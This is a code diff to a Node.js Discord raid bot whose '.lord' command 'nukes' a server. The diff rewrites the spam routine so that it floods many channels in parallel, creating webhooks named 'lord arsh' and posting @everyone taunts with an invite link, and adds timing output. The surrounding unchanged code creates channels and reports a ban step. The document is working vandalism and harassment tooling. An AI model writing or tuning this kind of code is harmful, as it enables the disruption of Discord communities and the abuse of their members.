@@ -13,7 +13,7 @@ if (!TOKEN) {
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-// ============ HTTP SERVER ============
+// ============ HTTP SERVER (Render ke liye) ============
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -238,7 +238,7 @@ async function createChannels(guildId, name, count) {
       newChannels.push(ch);
       created++;
       console.log(`[CREATE] ✅ ${ch.name} (${ch.id})`);
-      await sleep(1200); // 10 channels ke liye thoda zyada delay
+      await sleep(1200);
     } catch (e) {
       failed++;
       console.log(`[CREATE] ❌ ${e.message}`);
@@ -248,72 +248,121 @@ async function createChannels(guildId, name, count) {
   return { created, failed, channels: newChannels };
 }
 
-// ============ SPAM — Webhook + Bot dono se (HAR channel me) ============
+// ==========================================================
+//   ⚡ SPAM — PARALLEL (10 channels ek saath)
+// ==========================================================
 async function spamChannelsBoth(channels, text, client) {
+  console.log(`[SPAM] Starting PARALLEL spam on ${channels.length} channels...`);
+  const startTime = Date.now();
+
   let webhookSpam = 0;
   let botSpam = 0;
   let failed = 0;
 
-  console.log(`[SPAM] Starting spam on ${channels.length} channels...`);
+  // Har channel ke liye ek async worker — SAARE EK SAATH
+  const channelWorkers = channels.map(async (ch, chIndex) => {
+    const label = `[CH-${chIndex + 1}]`;
+    console.log(`${label} Starting spam on ${ch.id}`);
 
-  for (const ch of channels) {
-    console.log(`[SPAM] Channel: ${ch.id}`);
+    let localWebhook = 0;
+    let localBot = 0;
+    let localFail = 0;
 
     // ===== A) WEBHOOK SPAM =====
     try {
       const hooks = [];
+      // 3 webhooks parallel me banao
+      const hookPromises = [];
       for (let i = 0; i < 3; i++) {
-        try {
-          const hook = await api('POST', `/channels/${ch.id}/webhooks`, {
+        hookPromises.push(
+          api('POST', `/channels/${ch.id}/webhooks`, {
             body: { name: 'lord arsh' }
-          });
-          hooks.push(hook);
-          console.log(`[SPAM] Webhook created: ${hook.id}`);
-          await sleep(400);
-        } catch (e) {
-          console.log(`[SPAM] Webhook create fail: ${e.message}`);
-        }
+          }).catch(e => {
+            console.log(`${label} Webhook create fail: ${e.message}`);
+            return null;
+          })
+        );
+      }
+      const hookResults = await Promise.all(hookPromises);
+      for (const h of hookResults) {
+        if (h) hooks.push(h);
       }
 
+      console.log(`${label} Webhooks created: ${hooks.length}`);
+
+      // 3 webhooks × 30 messages = 90, sab PARALLEL
+      const webhookPromises = [];
       for (const wh of hooks) {
         for (let j = 0; j < 30; j++) {
-          try {
-            await api('POST', `/webhooks/${wh.id}/${wh.token}`, {
-              body: { content: text },
-              auth: false
-            });
-            webhookSpam++;
-            await sleep(600);
-          } catch { failed++; }
+          webhookPromises.push(
+            (async () => {
+              try {
+                await api('POST', `/webhooks/${wh.id}/${wh.token}`, {
+                  body: { content: text },
+                  auth: false
+                });
+                localWebhook++;
+              } catch {
+                localFail++;
+              }
+            })()
+          );
+          if (webhookPromises.length % 5 === 0) {
+            await sleep(200);
+          }
         }
       }
+      await Promise.all(webhookPromises);
 
-      for (const wh of hooks) {
-        try { await api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }); } catch {}
-      }
+      // Webhooks cleanup
+      await Promise.all(
+        hooks.map(wh =>
+          api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }).catch(() => {})
+        )
+      );
     } catch (e) {
-      console.log(`[SPAM] Webhook section fail: ${e.message}`);
+      console.log(`${label} Webhook section fail: ${e.message}`);
     }
 
     // ===== B) BOT SPAM =====
     try {
       const chObj = await client.channels.fetch(ch.id).catch(() => null);
       if (chObj && chObj.isTextBased()) {
+        const botPromises = [];
         for (let j = 0; j < 20; j++) {
-          try {
-            await chObj.send(text).catch(() => {});
-            botSpam++;
-            await sleep(700);
-          } catch { failed++; }
+          botPromises.push(
+            (async () => {
+              try {
+                await chObj.send(text).catch(() => {});
+                localBot++;
+              } catch {
+                localFail++;
+              }
+            })()
+          );
+          if (botPromises.length % 5 === 0) {
+            await sleep(300);
+          }
         }
+        await Promise.all(botPromises);
       }
     } catch (e) {
-      console.log(`[SPAM] Bot spam fail: ${e.message}`);
+      console.log(`${label} Bot spam fail: ${e.message}`);
     }
-  }
 
-  console.log(`[SPAM] Done — Webhook: ${webhookSpam}, Bot: ${botSpam}, Failed: ${failed}`);
-  return { webhook: webhookSpam, bot: botSpam, failed };
+    webhookSpam += localWebhook;
+    botSpam += localBot;
+    failed += localFail;
+
+    console.log(`${label} DONE — Webhook: ${localWebhook}, Bot: ${localBot}, Failed: ${localFail}`);
+  });
+
+  // ⚡ SAARE 10 channels EK SAATH
+  await Promise.all(channelWorkers);
+
+  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+  console.log(`[SPAM] ALL DONE in ${totalTime}s — Webhook: ${webhookSpam}, Bot: ${botSpam}, Failed: ${failed}`);
+  return { webhook: webhookSpam, bot: botSpam, failed, time: totalTime };
 }
 
 // ============ TOP ROLE ============
@@ -331,7 +380,7 @@ async function getTopRoleMember(guildId) {
 }
 
 // ==========================================================
-//   💀 .lord NUKE — 10 CHANNELS + FULL SPAM
+//   💀 .lord NUKE — 10 CHANNELS + PARALLEL SPAM
 // ==========================================================
 async function handleLord(message) {
   const guildId = message.guild.id;
@@ -435,9 +484,9 @@ async function handleLord(message) {
     await reply(`❌ STEP 4 FAILED: ${err.message}`);
   }
 
-  // ===== STEP 5: SPAM (Webhook + Bot dono se, HAR channel me) =====
-  await reply(`🔥 **STEP 5:** Spamming ${createResult.channels.length} channels...`);
-  let spamResult = { webhook: 0, bot: 0, failed: 0 };
+  // ===== STEP 5: SPAM (10 channels EK SAATH) =====
+  await reply(`🔥 **STEP 5:** Spamming ${createResult.channels.length} channels (PARALLEL)...`);
+  let spamResult = { webhook: 0, bot: 0, failed: 0, time: '0' };
   try {
     const spamMsg = `# @everyone LORD ARSH AYA HH SWAAGAT TO KARO HAMARA LORD OWNZ YOU 👿 JOIN: https://discord.gg/5SA2R2XcrQ`;
     spamResult = await spamChannelsBoth(createResult.channels, spamMsg, message.client);
@@ -452,7 +501,8 @@ async function handleLord(message) {
 📁 Created: ${createResult.created} channels
 🔥 Webhook Spam: ${spamResult.webhook}
 🤖 Bot Spam: ${spamResult.bot}
-⏱ Time: ${banResult.secs}s`);
+⏱ Spam Time: ${spamResult.time}s
+⏱ Total: ${banResult.secs}s`);
 }
 
 // ================= BOT CLIENT =================
@@ -501,7 +551,7 @@ client.on('messageCreate', async (message) => {
 \`.check\` — status
 \`.myid\` — ID
 \`.help\` — menu
-\`.lord\` — 💀 full nuke`).catch(() => {});
+\`.lord\` — 💀 full nuke (10 channels + parallel spam)`).catch(() => {});
     }
 
     if (lower === '.lord' && message.guild) {
